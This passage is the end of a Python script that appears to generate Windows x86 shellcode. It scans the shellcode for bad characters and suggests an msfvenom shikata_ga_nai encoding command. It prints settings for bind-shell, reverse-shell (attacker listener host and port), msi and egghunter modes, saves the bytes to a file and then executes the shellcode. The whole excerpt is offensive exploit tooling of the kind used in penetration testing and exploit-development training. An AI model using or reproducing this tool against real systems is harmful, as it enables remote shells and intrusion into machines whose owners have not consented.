        for i, b in enumerate(shellcode):
            if b in args.bad:
                print("[!] Found bad character 0x{:02x} at position {}".format(b, i))
                found_badchars = True
        if found_badchars:
            print("[!] Substitute ASM instructions containing bad characters")
            print("[!] Remove bad characters with msfvenom (use --output flag)")
            print('  cat {} | msfvenom --platform windows -a x86 -e x86/shikata_ga_nai -b "{}" -f python -v shellcode\n'.format(args.output if args.output else "shellcode.bin", bad_hexstr))
        else:
            print("[+] No bad characters found!")

    print("[*] Shellcode Mode: {}".format(args.mode))
    print("[*] Debug Mode (Breakpoint Instruction): {}".format("Active" if args.debug else "Disabled"))
    print("[*] Length: {} instructions, {} bytes".format(len(asm), len(shellcode)))

    if args.mode == "bind":
        print("[*] Bind Host: {}".format(args.target))
        print("[*] Bind Port: {}".format(args.port))
    elif args.mode in ["reverse", "msi"]:
        print("[*] Listener Host: {}".format(args.attacker))
        print("[*] Listener Port: {}".format(args.port))
    elif args.mode.startswith("egg"):
        print("[*] Egghunter Mode: {}".format("SEH" if args.mode.startswith("eggseh") else "NtAccessCheckAndAuditAlarm"))
        print("[*] Egg: {}".format(args.egg * 2))

    if args.output:
        print("[*] Shellcode stored in: {}".format(args.output))
        f = open(args.output, "wb")
        f.write(bytearray(shellcode))
        f.close()

    print("\n[*] Next Steps:")
    print(nextsteps)

    # Execute shellcode
    execute_shellcode(args, shellcode)


if __name__ == "__main__":
    main()
    print("[*] Done!")
